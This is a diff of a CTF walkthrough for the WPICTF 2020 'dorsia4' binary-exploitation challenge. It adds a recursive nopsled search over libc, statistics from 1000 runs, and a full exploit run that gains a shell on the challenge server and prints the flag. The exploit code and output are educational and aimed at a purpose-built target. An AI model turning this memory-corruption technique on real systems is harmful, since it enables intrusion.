@@ -23,7 +23,9 @@ I did not finish this challenge before the end of the CTF.  My theory was sound,
 
 THAT!!! is what I missed.  I'm writing this walkthrough as way to remind myself to _try harder_.
 
-> Too long? Bored? Then click [exploit.py](exploit.py).
+**UPDATE (less than 24 hours later):** I already knew my code didn't catch all nopsleds to `ret`, `printf`, `dprintf`, and `gadget`, but since I had success, I didn't worry about it.  Then my OCD kicked in, and I decided to refactor that part of the code, and now, guess what?  It works without `dprint`, ~60% of the time.  Instead of completely redoing this walkthrough, see the end for an _alternative ending_.
+
+> Too long? Bored? Then click [exploit.py](exploit.py) and [exploit2.py](exploit2.py) (_alternative ending_).
 
 
 ### Analysis
@@ -375,5 +377,126 @@ WPI{D0_you_like_Hu3y_Lew1s_&_the_News?}
 #### Flag
 
 ```
+WPI{D0_you_like_Hu3y_Lew1s_&_the_News?}
+```
+
+
+### _Alternative Ending_
+
+While there are some other minor changes to [exploit2.py](exploit2.py) the meat of the change is in the _computing safe address..._ section:
+
+```python
+def nopsled(addr):
+    a = []
+    for i in range(len(nops)-1,-1,-1):
+        if code[addr-i-1:addr] == nops[i].to_bytes(i+1,byteorder='big'):
+            a.append(addr-i-1)
+            a += nopsled(addr-i-1)
+    return a
+
+addrs = []
+code = open('libc.so.6','rb').read()
+t=time.time()
+print("\ncomputing safe addresses...",end="")
+for i in range(len(code)):
+    if code[i] == 0xc3 or i == libc.symbols['printf'] or i == gadget:
+        addrs.append((baselibc + i) & 0xFFFFFF)
+        addrs += [((baselibc + x) & 0xFFFFFF) for x in nopsled(i)]
+print(int(time.time() - t),end="")
+print(" seconds")
+```
+
+Using recursion and checking all possible options it is now possible without adding `libc.symbols['dprintf']` to the list of safe address to solve this challenge.
+
+After 1000 runs, here's the stats:
+
+```
+# sed 's/SIGSEGV.*/SIGSEGV/' test1000c.out | egrep "(path|SIG|WPI|dorsia4)" | sort | uniq -c | sort -r -n
+   1000 [*] '/pwd/datajerk/wpictf2020/dorsia4/nanowrite'
+    605 b'WPI{D0_you_like_Hu3y_Lew1s_&_the_News?}\n'
+    369 no path for you!
+    357 path found (len: 21):
+    274 path found (len: 19):
+     26 [*] Process './nanowrite' stopped with exit code -11 (SIGSEGV
+```
+
+The previous code could not find a path ~1/8th of the time.  The newer version without `dprintf` added as a safe address is worse at ~3/8ths making the likelihood of a flag ~60%.  `SEGSEGV`s are down as well, but proportional to the number of good paths, so, no surprise.
+
+The paths are also completely different without `dprintf`, implying there was never a path with the previous code that did not bounce through `dprintf`.
+
+This is the solution I was working for before the end of the CTF.  Sadly I just failed to find every nopsled.
+
+
+#### Output
+
+```
+# ./exploit2.py
+[*] '/pwd/datajerk/wpictf2020/dorsia4/nanowrite'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to dorsia4.wpictf.xyz on port 31337: Done
+[*] '/pwd/datajerk/wpictf2020/dorsia4/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+system:  0x7e0e3d0b8440
+libc:    0x7e0e3d069000
+printf:  0x7e0e3d0cde80
+
+computing safe addresses...0 seconds
+building graph...11 seconds
+
+path found (len: 21):
+
+0xcde80
+0xcde73
+0xc7973
+0xc793f
+0x17793f
+0x179a3f
+0x179a50
+0x179950
+0x179990
+0x17ad90
+0x18ad90
+0x18ad3b
+0x18be3b
+0x18be9f
+0x18a69f
+0x18a6e4
+0xba6e4
+0xba66a
+0xb7d6a
+0xb7d22
+0xb8322
+
+put 0x73 in 0
+put 0x79 in 1
+put 0x3f in 0
+put 0x17 in 2
+put 0x9a in 1
+put 0x50 in 0
+put 0x99 in 1
+put 0x90 in 0
+put 0xad in 1
+put 0x18 in 2
+put 0x3b in 0
+put 0xbe in 1
+put 0x9f in 0
+put 0xa6 in 1
+put 0xe4 in 0
+put 0xb in 2
+put 0x6a in 0
+put 0x7d in 1
+put 0x22 in 0
+put 0x83 in 1
+
+[*] Switching to interactive mode
+$ cat flag.txt
 WPI{D0_you_like_Hu3y_Lew1s_&_the_News?}
 ```
